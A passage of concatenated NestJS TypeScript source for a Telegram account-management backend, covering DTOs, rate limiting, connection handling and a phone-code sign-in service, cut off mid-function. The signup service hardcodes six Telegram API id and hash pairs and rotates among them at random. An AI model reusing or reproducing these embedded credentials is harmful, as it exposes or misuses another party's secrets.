@IsOptional()\r\n  @IsDateString()\r\n  @Transform(({ value }) => value ? new Date(value) : undefined)\r\n  beforeDate?: Date;\r\n\r\n  @ApiProperty({ description: 'Only delete media messages', required: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  onlyMedia?: boolean;\r\n\r\n  @ApiProperty({ description: 'Exclude pinned messages', required: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  excludePinned?: boolean;\r\n}\r\n\r\nexport class createGroupDto {\r\n  @ApiProperty({ description: 'Group title', required: true })\r\n  @IsString()\r\n  @IsNotEmpty()\r\n  title: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Group description', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  description?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Address or location of the group', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  address?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Slow mode delay in seconds', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  slowMode?: number = 0;\r\n\r\n  @ApiPropertyOptional({ description: 'Whether the group is a megagroup', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  megagroup?: boolean = true;\r\n\r\n  @ApiPropertyOptional({ description: 'Whether the group is for import', default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  forImport?: boolean = false;\r\n\r\n  @ApiPropertyOptional({ description: 'Member restrictions', required: false })\r\n  @IsOptional()\r\n  @IsObject()\r\n  memberRestrictions?: {\r\n    sendMessages?: boolean;\r\n    sendMedia?: boolean;\r\n    sendStickers?: boolean;\r\n    sendGifs?: boolean;\r\n    sendGames?: boolean;\r\n    sendInline?: boolean;\r\n    embedLinks?: boolean;\r\n  };\r\n}\r\n","// Core Types and Interfaces\r\nexport * from '../../../interfaces/telegram';\r\n\r\n// Base DTOs\r\nexport * from './batch-operations.dto';\r\nexport * from './media-operations.dto';\r\nexport * from './schedule-operations.dto';\r\nexport * from './metadata-operations.dto';\r\nexport * from './group-operations.dto';\r\nexport * from './contact-management.dto';\r\nexport * from './profile-settings.dto';\r\n\r\n// Type Re-exports\r\nexport { BatchOperationType } from './batch-operations.dto';\r\nexport { MediaType } from './media-operations.dto';\r\nexport { AdminPermission } from './group-operations.dto';\r\nexport { ExportFormat } from './contact-management.dto';\r\n","import { IsString, IsOptional, IsNumber, IsArray, IsEnum, IsUrl, ValidateNested } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Transform, Type } from 'class-transformer';\r\n\r\nexport enum MediaType {\r\n  PHOTO = 'photo',\r\n  VIDEO = 'video',\r\n  DOCUMENT = 'document',\r\n  VOICE = 'voice',\r\n  AUDIO = 'audio'\r\n}\r\n\r\n// Base class for media operations\r\nexport class BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'Chat ID for media operation' })\r\n  @IsString()\r\n  chatId: string;\r\n}\r\n\r\nexport class MediaSearchDto extends BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'Media types to include', enum: MediaType, isArray: true })\r\n  @IsArray()\r\n  @IsEnum(MediaType, { each: true })\r\n  types: MediaType[];\r\n\r\n  @ApiProperty({ description: 'Message offset', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  @Transform(({ value }) => parseInt(value))\r\n  offset?: number;\r\n\r\n  @ApiProperty({ description: 'Items per page', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  @Transform(({ value }) => parseInt(value))\r\n  limit?: number = 50;\r\n}\r\n\r\nexport class MediaFilterDto extends MediaSearchDto {\r\n  @ApiProperty({ description: 'Start date for filtering', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  @Transform(({ value }) => value ? new Date(value).toISOString() : undefined)\r\n  startDate?: string;\r\n\r\n  @ApiProperty({ description: 'End date for filtering', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  @Transform(({ value }) => value ? new Date(value).toISOString() : undefined)\r\n  endDate?: string;\r\n}\r\n\r\nexport class SendMediaDto extends BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'URL of the media file' })\r\n  @IsString()\r\n  @IsUrl()\r\n  url: string;\r\n\r\n  @ApiProperty({ description: 'Caption for the media', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  caption?: string;\r\n\r\n  @ApiProperty({ description: 'Filename for the media' })\r\n  @IsString()\r\n  filename: string;\r\n\r\n  @ApiProperty({ description: 'Type of media', enum: MediaType })\r\n  @IsEnum(MediaType)\r\n  type: MediaType;\r\n}\r\n\r\nexport class MediaAlbumItemDto {\r\n  @ApiProperty({ description: 'URL of the media file' })\r\n  @IsString()\r\n  @IsUrl()\r\n  url: string;\r\n\r\n  @ApiProperty({ description: 'Type of media', enum: MediaType })\r\n  @IsEnum(MediaType)\r\n  type: MediaType;\r\n\r\n  @ApiProperty({ description: 'Caption for the media item', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  caption?: string;\r\n}\r\n\r\nexport class SendMediaAlbumDto extends BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'Array of media items', type: [MediaAlbumItemDto] })\r\n  @IsArray()\r\n  @ValidateNested({ each: true })\r\n  @Type(() => MediaAlbumItemDto)\r\n  media: MediaAlbumItemDto[];\r\n}\r\n\r\nexport class VoiceMessageDto extends BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'URL of the voice message file' })\r\n  @IsString()\r\n  @IsUrl()\r\n  url: string;\r\n\r\n  @ApiProperty({ description: 'Duration of voice message in seconds', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  duration?: number;\r\n\r\n  @ApiProperty({ description: 'Caption for the voice message', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  caption?: string;\r\n}","import { IsString, IsOptional, IsNumber, IsArray, IsEnum } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport enum MessageType {\r\n  ALL = 'all',\r\n  TEXT = 'text',\r\n  PHOTO = 'photo',\r\n  VIDEO = 'video',\r\n  VOICE = 'voice',\r\n  DOCUMENT = 'document'\r\n}\r\n\r\nexport class MessageSearchDto {\r\n  @ApiProperty({ description: 'Chat ID to search in' })\r\n  @IsString()\r\n  chatId: string;\r\n\r\n  @ApiProperty({ description: 'Text to search for', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  query?: string;\r\n\r\n  @ApiProperty({ description: 'Types of messages to include', enum: MessageType, isArray: true, required: false })\r\n  @IsOptional()\r\n  @IsArray()\r\n  @IsEnum(MessageType, { each: true })\r\n  types?: MessageType[];\r\n\r\n  @ApiProperty({ description: 'Offset for pagination', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  offset?: number;\r\n\r\n  @ApiProperty({ description: 'Limit for pagination', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  limit?: number = 20;\r\n}","import { IsString, IsNumber, IsOptional, IsArray, IsBoolean, Min, Max, Length, ArrayMinSize, ArrayMaxSize, IsNotEmpty, IsEnum } from 'class-validator';\r\nimport { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Transform, Type } from 'class-transformer';\r\n\r\nexport enum MetadataType {\r\n    PHOTO = 'photo',\r\n    VIDEO = 'video',\r\n    DOCUMENT = 'document'\r\n}\r\n\r\nexport class MediaMetadataDto {\r\n    @ApiProperty({ description: 'Chat ID to get metadata from' })\r\n    @IsString()\r\n    chatId: string;\r\n\r\n    @ApiProperty({ description: 'Message offset', required: false })\r\n    @IsOptional()\r\n    @IsNumber()\r\n    offset?: number;\r\n\r\n    @ApiProperty({ description: 'Maximum number of items', required: false })\r\n    @IsOptional()\r\n    @IsNumber()\r\n    limit?: number = 50;\r\n}\r\n\r\nexport class DialogsQueryDto {\r\n    @ApiPropertyOptional({ description: 'Number of dialogs to fetch', required: false, type: Number, minimum: 1, maximum: 1000 })\r\n    @IsOptional()\r\n    @Transform(({ value }) => parseInt(value))\r\n    @IsNumber()\r\n    @Min(1)\r\n    @Max(1000)\r\n    limit: number = 100;\r\n\r\n    @ApiPropertyOptional({ description: 'Dialog offset', required: false, type: Number, minimum: 0 })\r\n    @IsOptional()\r\n    @Transform(({ value }) => parseInt(value))\r\n    @IsNumber()\r\n    @Min(0)\r\n    offsetId?: number = 0;\r\n\r\n    @ApiPropertyOptional({ description: 'Include archived chats', required: false, type: Boolean })\r\n    @IsOptional()\r\n    @Transform(({ value }) => {\r\n        if (value === 'true') return true;\r\n        if (value === 'false') return false;\r\n        return value;\r\n    })\r\n    @IsBoolean()\r\n    archived?: boolean = false;\r\n}\r\n\r\nexport class BulkMessageOperationDto {\r\n    @ApiProperty({ description: 'Source chat ID', type: String, minLength: 1, maxLength: 255 })\r\n    @IsString()\r\n    fromChatId!: string;\r\n\r\n    @ApiProperty({ description: 'Target chat ID', type: String, minLength: 1, maxLength: 255 })\r\n    @IsString()\r\n    toChatId!: string;\r\n\r\n    @ApiProperty({ description: 'Message IDs to operate on', type: [Number], minItems: 1, maxItems: 100 })\r\n    @Transform(({ value }) => Array.isArray(value) ? value.map(Number) : value)\r\n    messageIds!: number[];\r\n}","import { IsString, IsOptional, IsEnum, IsBoolean } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { PrivacyLevel, PrivacyLevelEnum } from '../../../interfaces/telegram';\r\n\r\nexport class UpdateProfileDto {\r\n  @ApiProperty({ description: 'First name' })\r\n  @IsString()\r\n  firstName: string;\r\n\r\n  @ApiProperty({ description: 'About/bio information', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  about?: string;\r\n}\r\n\r\nexport class PrivacySettingsDto {\r\n  @ApiProperty({ description: 'Phone number visibility', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  phoneNumber?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Last seen visibility', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  lastSeen?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Profile photos visibility', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  profilePhotos?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Message forwards visibility', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  forwards?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Calls privacy', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  calls?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Group chats privacy', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  groups?: PrivacyLevel;\r\n}\r\n\r\nexport class SecuritySettingsDto {\r\n  @ApiProperty({ description: 'Enable/disable two-factor authentication' })\r\n  @IsBoolean()\r\n  twoFactorAuth: boolean;\r\n\r\n  @ApiProperty({ description: 'Active sessions limit', required: false })\r\n  @IsOptional()\r\n  @IsEnum([1, 2, 3, 4, 5])\r\n  activeSessionsLimit?: number;\r\n}\r\n\r\nexport class ProfilePhotoDto {\r\n  @ApiProperty({ description: 'Name/identifier of the photo to set' })\r\n  @IsString()\r\n  name: string;\r\n}","import { IsString, IsOptional, IsNumber, IsBoolean, IsDateString } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Transform } from 'class-transformer';\r\nimport { BaseBatchItemDto } from './batch-operations.dto';\r\n\r\nexport class ScheduleMessageDto extends BaseBatchItemDto {\r\n  @ApiProperty({ description: 'Message content' })\r\n  @IsString()\r\n  message: string;\r\n\r\n  @ApiProperty({ description: 'Date to schedule the message' })\r\n  @IsDateString()\r\n  @Transform(({ value }) => new Date(value))\r\n  scheduledTime: string;\r\n\r\n  @ApiProperty({ description: 'Message to reply to', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  replyTo?: number;\r\n\r\n  @ApiProperty({ description: 'Silent notification', required: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  silent?: boolean;\r\n}\r\n\r\nexport class GetScheduledMessagesDto extends BaseBatchItemDto {\r\n  @ApiProperty({ description: 'Maximum number of messages to return', required: false, default: 50 })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  @Transform(({ value }) => parseInt(value))\r\n  limit?: number = 50;\r\n}\r\n\r\nexport class DeleteScheduledMessageDto extends BaseBatchItemDto {\r\n  @ApiProperty({ description: 'ID of the scheduled message to delete' })\r\n  @IsNumber()\r\n  messageId: number;\r\n}\r\n\r\nexport class RescheduleMessageDto {\r\n  @ApiProperty({ description: 'Chat ID containing the message' })\r\n  @IsString()\r\n  chatId: string;\r\n\r\n  @ApiProperty({ description: 'Message ID to reschedule' })\r\n  @IsNumber()\r\n  messageId: number;\r\n\r\n  @ApiProperty({ description: 'New schedule date (ISO string)' })\r\n  @IsDateString()\r\n  newScheduleDate: string;\r\n}\r\n\r\nexport class BatchProcessItemDto {\r\n  @ApiProperty({ description: 'Chat ID or message ID depending on operation' })\r\n  @IsString()\r\n  chatId: string;\r\n\r\n  @ApiProperty({ description: 'Message ID for operations that require it', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  messageId?: number;\r\n}\r\n","export class TelegramError extends Error {\r\n    status: any;\r\n    constructor(\r\n        message: string,\r\n        public readonly code?: string,\r\n        public readonly details?: unknown\r\n    ) {\r\n        super(message);\r\n        this.name = 'TelegramError';\r\n    }\r\n}\r\n\r\nexport enum TelegramErrorCode {\r\n    CLIENT_NOT_FOUND = 'CLIENT_NOT_FOUND',\r\n    CONNECTION_FAILED = 'CONNECTION_FAILED',\r\n    OPERATION_FAILED = 'OPERATION_FAILED',\r\n    INVALID_SESSION = 'INVALID_SESSION',\r\n    FLOOD_WAIT = 'FLOOD_WAIT',\r\n    PHONE_CODE_INVALID = 'PHONE_CODE_INVALID',\r\n    PHONE_CODE_EXPIRED = 'PHONE_CODE_EXPIRED'\r\n}","import { ClientMetadata } from '../types/client-operations';\r\n\r\nexport class ClientMetadataTracker {\r\n    private static instance: ClientMetadataTracker;\r\n    private metadata: Map<string, ClientMetadata> = new Map();\r\n\r\n    private constructor() {}\r\n\r\n    static getInstance(): ClientMetadataTracker {\r\n        if (!ClientMetadataTracker.instance) {\r\n            ClientMetadataTracker.instance = new ClientMetadataTracker();\r\n        }\r\n        return ClientMetadataTracker.instance;\r\n    }\r\n\r\n    initializeClient(mobile: string): void {\r\n        this.metadata.set(mobile, {\r\n            connectedAt: Date.now(),\r\n            lastOperation: '',\r\n            lastOperationTime: 0,\r\n            totalOperations: 0,\r\n            failedOperations: 0,\r\n            reconnectCount: 0\r\n        });\r\n    }\r\n\r\n    recordOperation(mobile: string, operation: string, success: boolean): void {\r\n        const data = this.metadata.get(mobile);\r\n        if (data) {\r\n            data.lastOperation = operation;\r\n            data.lastOperationTime = Date.now();\r\n            data.totalOperations++;\r\n            if (!success) {\r\n                data.failedOperations++;\r\n            }\r\n            this.metadata.set(mobile, data);\r\n        }\r\n    }\r\n\r\n    recordReconnect(mobile: string): void {\r\n        const data = this.metadata.get(mobile);\r\n        if (data) {\r\n            data.reconnectCount++;\r\n            this.metadata.set(mobile, data);\r\n        }\r\n    }\r\n\r\n    getMetadata(mobile: string): ClientMetadata | undefined {\r\n        return this.metadata.get(mobile);\r\n    }\r\n\r\n    getAllMetadata(): Map<string, ClientMetadata> {\r\n        return new Map(this.metadata);\r\n    }\r\n\r\n    removeClient(mobile: string): void {\r\n        this.metadata.delete(mobile);\r\n    }\r\n\r\n    getStatistics(): {\r\n        totalClients: number;\r\n        totalOperations: number;\r\n        failedOperations: number;\r\n        averageReconnects: number;\r\n    } {\r\n        let totalOps = 0;\r\n        let failedOps = 0;\r\n        let totalReconnects = 0;\r\n        const clientCount = this.metadata.size;\r\n\r\n        for (const data of this.metadata.values()) {\r\n            totalOps += data.totalOperations;\r\n            failedOps += data.failedOperations;\r\n            totalReconnects += data.reconnectCount;\r\n        }\r\n\r\n        return {\r\n            totalClients: clientCount,\r\n            totalOperations: totalOps,\r\n            failedOperations: failedOps,\r\n            averageReconnects: clientCount ? totalReconnects / clientCount : 0\r\n        };\r\n    }\r\n}","import { TelegramError, TelegramErrorCode } from '../types/telegram-error';\r\nimport { RateLimiter } from './rate-limiter';\r\nimport TelegramManager from '../TelegramManager';\r\n\r\nexport class ConnectionManager {\r\n    private static instance: ConnectionManager;\r\n    private clientRateLimiter: RateLimiter;\r\n    private operationRateLimiter: RateLimiter;\r\n    private activeConnections: Map<string, { client: TelegramManager; lastUsed: number }>;\r\n\r\n    private constructor() {\r\n        // Rate limit: 5 new connections per minute per mobile\r\n        this.clientRateLimiter = new RateLimiter(60000, 5);\r\n        // Rate limit: 30 operations per minute per client\r\n        this.operationRateLimiter = new RateLimiter(60000, 30);\r\n        this.activeConnections = new Map();\r\n    }\r\n\r\n    static getInstance(): ConnectionManager {\r\n        if (!ConnectionManager.instance) {\r\n            ConnectionManager.instance = new ConnectionManager();\r\n        }\r\n        return ConnectionManager.instance;\r\n    }\r\n\r\n    async acquireConnection(mobile: string, client: TelegramManager): Promise<void> {\r\n        await this.clientRateLimiter.waitForRateLimit(mobile);\r\n        this.activeConnections.set(mobile, {\r\n            client,\r\n            lastUsed: Date.now()\r\n        });\r\n    }\r\n\r\n    async releaseConnection(mobile: string): Promise<void> {\r\n        const connection = this.activeConnections.get(mobile);\r\n        if (connection) {\r\n            try {\r\n                await connection.client.disconnect();\r\n            } catch (error) {\r\n                console.error(`Error disconnecting client ${mobile}:`, error);\r\n            } finally {\r\n                this.activeConnections.delete(mobile);\r\n            }\r\n        }\r\n    }\r\n\r\n    async cleanupInactiveConnections(maxIdleTime: number = 180000): Promise<void> {\r\n        const now = Date.now();\r\n        for (const [mobile, connection] of this.activeConnections.entries()) {\r\n            if (now - connection.lastUsed > maxIdleTime) {\r\n                console.log(`Releasing inactive connection for ${mobile}`);\r\n                await this.releaseConnection(mobile);\r\n            }\r\n        }\r\n    }\r\n\r\n    async executeWithRateLimit<T>(mobile: string, operation: () => Promise<T>): Promise<T> {\r\n        await this.operationRateLimiter.waitForRateLimit(mobile);\r\n        try {\r\n            return await operation();\r\n        } catch (error) {\r\n            if (error.message?.includes('FLOOD_WAIT')) {\r\n                throw new TelegramError(\r\n                    'Rate limit exceeded',\r\n                    TelegramErrorCode.FLOOD_WAIT,\r\n                    { waitTime: parseInt(error.message.match(/\\d+/)?.[0] || '0') }\r\n                );\r\n            }\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    updateLastUsed(mobile: string): void {\r\n        const connection = this.activeConnections.get(mobile);\r\n        if (connection) {\r\n            connection.lastUsed = Date.now();\r\n            this.activeConnections.set(mobile, connection);\r\n        }\r\n    }\r\n\r\n    getActiveConnectionCount(): number {\r\n        return this.activeConnections.size;\r\n    }\r\n\r\n    startCleanupInterval(interval: number = 60000): NodeJS.Timer {\r\n        return setInterval(() => this.cleanupInactiveConnections(), interval);\r\n    }\r\n}","export class RateLimiter {\r\n    private timestamps: Map<string, number[]> = new Map();\r\n    private readonly windowMs: number;\r\n    private readonly maxRequests: number;\r\n\r\n    constructor(windowMs: number, maxRequests: number) {\r\n        this.windowMs = windowMs;\r\n        this.maxRequests = maxRequests;\r\n    }\r\n\r\n    async checkRateLimit(key: string): Promise<boolean> {\r\n        const now = Date.now();\r\n        const timestamps = this.timestamps.get(key) || [];\r\n        \r\n        // Remove timestamps outside the window\r\n        const validTimestamps = timestamps.filter(\r\n            timestamp => now - timestamp < this.windowMs\r\n        );\r\n\r\n        if (validTimestamps.length >= this.maxRequests) {\r\n            return false;\r\n        }\r\n\r\n        validTimestamps.push(now);\r\n        this.timestamps.set(key, validTimestamps);\r\n        return true;\r\n    }\r\n\r\n    async waitForRateLimit(key: string): Promise<void> {\r\n        while (!(await this.checkRateLimit(key))) {\r\n            await new Promise(resolve => setTimeout(resolve, 1000));\r\n        }\r\n    }\r\n\r\n    resetLimit(key: string): void {\r\n        this.timestamps.delete(key);\r\n    }\r\n}","import { Logger } from '@nestjs/common';\r\n\r\nexport class TelegramLogger {\r\n    private static instance: TelegramLogger;\r\n    private logger: Logger;\r\n\r\n    private constructor() {\r\n        this.logger = new Logger('TelegramService');\r\n    }\r\n\r\n    static getInstance(): TelegramLogger {\r\n        if (!TelegramLogger.instance) {\r\n            TelegramLogger.instance = new TelegramLogger();\r\n        }\r\n        return TelegramLogger.instance;\r\n    }\r\n\r\n    logOperation(mobile: string, operation: string, details?: any): void {\r\n        this.logger.log(`[${mobile}] ${operation} - ${JSON.stringify(details || {})}`);\r\n    }\r\n\r\n    logError(mobile: string, operation: string, error: any): void {\r\n        this.logger.error(\r\n            `[${mobile}] ${operation} failed - ${error.message}`,\r\n            error.stack\r\n        );\r\n    }\r\n\r\n    logWarning(mobile: string, message: string, details?: any): void {\r\n        this.logger.warn(`[${mobile}] ${message} - ${JSON.stringify(details || {})}`);\r\n    }\r\n\r\n    logDebug(mobile: string, message: string, details?: any): void {\r\n        this.logger.debug(`[${mobile}] ${message} - ${JSON.stringify(details || {})}`);\r\n    }\r\n}","import { Module, forwardRef } from '@nestjs/common';\r\nimport { TgSignupController } from './tgSignup.controller';\r\nimport { UsersModule } from '../users/users.module';\r\nimport { TgSignupService } from './TgSignup.service';\r\n\r\n@Module({\r\n    imports: [forwardRef(() => UsersModule)],\r\n    controllers: [TgSignupController],\r\n    providers: [TgSignupService],\r\n    exports: [TgSignupService]\r\n})\r\nexport class TgSignupModule { }\r\n","import { Injectable, BadRequestException, Logger, InternalServerErrorException, OnModuleDestroy } from \"@nestjs/common\";\r\nimport { Api } from \"telegram/tl\";\r\nimport { TelegramClient } from \"telegram\";\r\nimport { StringSession } from \"telegram/sessions\";\r\nimport { LogLevel } from \"telegram/extensions/Logger\";\r\nimport { computeCheck } from \"telegram/Password\";\r\nimport { sleep } from \"telegram/Helpers\";\r\nimport { UsersService } from \"../users/users.service\";\r\nimport { TgSignupResponse } from \"./dto/tg-signup.dto\";\r\nimport { CreateUserDto } from \"../users/dto/create-user.dto\";\r\nimport { parseError } from \"../../utils/parseError\";\r\n\r\ninterface ITelegramCredentials {\r\n    apiId: number;\r\n    apiHash: string;\r\n}\r\n\r\n@Injectable()\r\nexport class TgSignupService implements OnModuleDestroy {\r\n    private readonly logger = new Logger(TgSignupService.name);\r\n    private static readonly LOGIN_TIMEOUT = 300000; // 10 minutes instead of 2.5\r\n    private static readonly SESSION_CLEANUP_INTERVAL = 300000; // 5 minutes instead of 2\r\n    private static readonly PHONE_PREFIX = \"+\"; // Prefix for phone numbers\r\n    private readonly cleanupInterval: NodeJS.Timeout;\r\n\r\n    // Map to store active client sessions\r\n    private static readonly activeClients = new Map<string, {\r\n        client: TelegramClient;\r\n        phoneCodeHash: string;\r\n        timeoutId: NodeJS.Timeout;\r\n        createdAt: number;\r\n    }>();\r\n\r\n    // API credentials pool for load balancing with correct hashes\r\n    private static readonly API_CREDENTIALS: ITelegramCredentials[] = [\r\n        { apiId: 27919939, apiHash: \"5ed3834e741b57a560076a1d38d2fa94\" },\r\n        { apiId: 25328268, apiHash: \"b4e654dd2a051930d0a30bb2add80d09\" },\r\n        { apiId: 12777557, apiHash: \"05054fc7885dcfa18eb7432865ea3500\" },\r\n        { apiId: 27565391, apiHash: \"a3a0a2e895f893e2067dae111b20f2d9\" },\r\n        { apiId: 27586636, apiHash: \"f020539b6bb5b945186d39b3ff1dd998\" },\r\n        { apiId: 29210552, apiHash: \"f3dbae7e628b312c829e1bd341f1e9a9\" }\r\n    ];\r\n\r\n    constructor(private readonly usersService: UsersService) {\r\n        this.cleanupInterval = setInterval(() => this.cleanupStaleSessions(), TgSignupService.SESSION_CLEANUP_INTERVAL);\r\n    }\r\n\r\n    async onModuleDestroy() {\r\n        clearInterval(this.cleanupInterval);\r\n        // Cleanup all active sessions\r\n        const phones = Array.from(TgSignupService.activeClients.keys());\r\n        await Promise.all(phones.map(phone => this.disconnectClient(phone)));\r\n    }\r\n\r\n    private getRandomCredentials(): ITelegramCredentials {\r\n        const index = Math.floor(Math.random() * TgSignupService.API_CREDENTIALS.length);\r\n        return TgSignupService.API_CREDENTIALS[index];\r\n    }\r\n\r\n    private async cleanupStaleSessions() {\r\n        for (const [phone, session] of TgSignupService.activeClients) {\r\n            try {\r\n                // Only cleanup if session is truly stale (disconnected and timeout exceeded)\r\n                if (Date.now() - session.createdAt > TgSignupService.LOGIN_TIMEOUT &&\r\n                    (!session.client || !session.client.connected)) {\r\n                    await this.disconnectClient(phone);\r\n                }\r\n            } catch (error) {\r\n                this.logger.warn(`Error cleaning up session for ${phone}: ${error.message}`);\r\n            }\r\n        }\r\n    }\r\n\r\n    private validatePhoneNumber(phone: string): string {\r\n        // Remove any existing + prefix\r\n        phone = phone.replace(/^\\+/, '');\r\n\r\n        // Validate phone number format\r\n        if (!/^\\d{8,15}$/.test(phone)) {\r\n            throw new BadRequestException('Please enter a valid phone number');\r\n        }\r\n\r\n        return phone;\r\n    }\r\n\r\n    private async disconnectClient(phone: string): Promise<void> {\r\n        const session = TgSignupService.activeClients.get(phone);\r\n        if (session) {\r\n            try {\r\n                clearTimeout(session.timeoutId);\r\n                if (session.client?.connected) {\r\n                    await session.client.disconnect();\r\n                }\r\n                if (session.client) {\r\n                    await session.client.destroy();\r\n                }\r\n            } catch (error) {\r\n                this.logger.warn(`Error disconnecting client for ${phone}: ${error.message}`);\r\n            } finally {\r\n                TgSignupService.activeClients.delete(phone);\r\n            }\r\n        }\r\n    }\r\n\r\n    async sendCode(phone: string): Promise<Pick<TgSignupResponse, 'phoneCodeHash' | 'isCodeViaApp'>> {\r\n        try {\r\n            phone = this.validatePhoneNumber(phone);\r\n\r\n            // Check if there's an existing active session that can be reused\r\n            const existingSession = TgSignupService.activeClients.get(phone);\r\n            if (existingSession && existingSession.client?.connected) {\r\n                // If session exists and is still valid, disconnect it before creating new one\r\n                await this.disconnectClient(phone);\r\n            }\r\n\r\n            const { apiId, apiHash } = this.getRandomCredentials();\r\n            const session = new StringSession('');\r\n            const client = new TelegramClient(session, apiId, apiHash, {\r\n                connectionRetries: 5,\r\n                retryDelay: 2000,\r\n                useWSS: true,\r\n                timeout: 30000\r\n            });\r\n\r\n            await client.setLogLevel(LogLevel.ERROR);\r\n\r\n            await client.connect();\r\n\r\n            const sendResult = await client.invoke(\r\n                new Api.auth.SendCode({\r\n                    phoneNumber: phone,\r\n                    apiId,\r\n                    apiHash,\r\n                    settings: new Api.CodeSettings({\r\n                        currentNumber: true,\r\n                        allowAppHash: true,\r\n                    }),\r\n                })\r\n            );\r\n\r\n            if (sendResult instanceof Api.auth.SentCodeSuccess) {\r\n                this.logger.error(`Unexpected immediate login for ${phone}`);\r\n                throw new BadRequestException('Unexpected immediate login');\r\n            }\r\n            const timeoutId = setTimeout(() => this.disconnectClient(phone), TgSignupService.LOGIN_TIMEOUT);\r\n\r\n            TgSignupService.activeClients.set(phone, {\r\n                client,\r\n                phoneCodeHash: sendResult.phoneCodeHash,\r\n                timeoutId,\r\n                createdAt: Date.now()\r\n            });\r\n\r\n            return {\r\n                phoneCodeHash: sendResult.phoneCodeHash,\r\n                isCodeViaApp: sendResult.type instanceof Api.auth.SentCodeTypeApp,\r\n            };\r\n        } catch (error) {\r\n            this.logger.error(`Failed to send code to ${phone}: ${error.message}`, error.stack);\r\n            await this.disconnectClient(phone);\r\n            \r\n            if (error.errorMessage?.includes('PHONE_NUMBER_BANNED')) {\r\n                throw new BadRequestException('This phone number has been banned from Telegram');\r\n            }\r\n            if (error.errorMessage?.includes('PHONE_NUMBER_INVALID')) {\r\n                throw new BadRequestException('Please enter a valid phone number');\r\n            }\r\n            if (error.errorMessage?.includes('FLOOD_WAIT')) {\r\n                throw new BadRequestException('Please wait a few minutes before trying again');\r\n            }\r\n            \r\n            throw new BadRequestException('Unable to send OTP. Please try again');\r\n        }\r\n    }\r\n\r\n    async verifyCode(phone: string, code: string, password?: string): Promise<TgSignupResponse> {\r\n        try {\r\n            phone = this.validatePhoneNumber(phone);\r\n\r\n            const session = TgSignupService.activeClients.get(phone);\r\n            if (!session) {\r\n                this.logger.warn(`No active signup session found for ${phone}`);\r\n                throw new BadRequestException('Session Expired. Please start again');\r\n            }\r\n\r\n            // Always extend session timeout on verification attempt, regardless of success\r\n            clearTimeout(session.timeoutId);\r\n            session.timeoutId = setTimeout(() => this.disconnectClient(phone), TgSignupService.LOGIN_TIMEOUT);\r\n\r\n            if (!session.client?.connected) {\r\n                try {\r\n                    await session.client?.connect();\r\n                } catch (error) {\r\n                    // Don't disconnect, just try to reconnect\r\n                    this.logger.warn(`Connection lost for ${phone}, attempting to reconnect`);\r\n                    try {\r\n                        const { apiId, apiHash } = this.getRandomCredentials();\r\n                        const newSession = new StringSession('');\r\n                        const newClient = new TelegramClient(newSession, apiId, apiHash, {\r\n                            connectionRetries: 5,\r\n                            retryDelay: 2000,\r\n                            useWSS: true,\r\n                            timeout: 30000\r\n                        });\r\n                        await newClient.connect();\r\n                        session.client = newClient;\r\n                    } catch (reconnectError) {\r\n                        throw new BadRequestException('Connection failed. Please try verifying again.');\r\n                    }\r\n                }\r\n            }\r\n\r\n            const { client, phoneCodeHash } = session;\r\n\r\n            try {\r\n                this.logger.debug(`Attempting to sign in with code for ${phone}`);\r\n                const signInResult = await client.invoke(\r\n                    new Api.auth.SignIn({\r\n                        phoneNumber: phone,\r\n                        phoneCodeHash,\r\n                        phoneCode: code,\r\n                    })\r\n                ) as Api.auth.Authorization;\r\n\r\n                if (!signInResult) {\r\n                    throw new 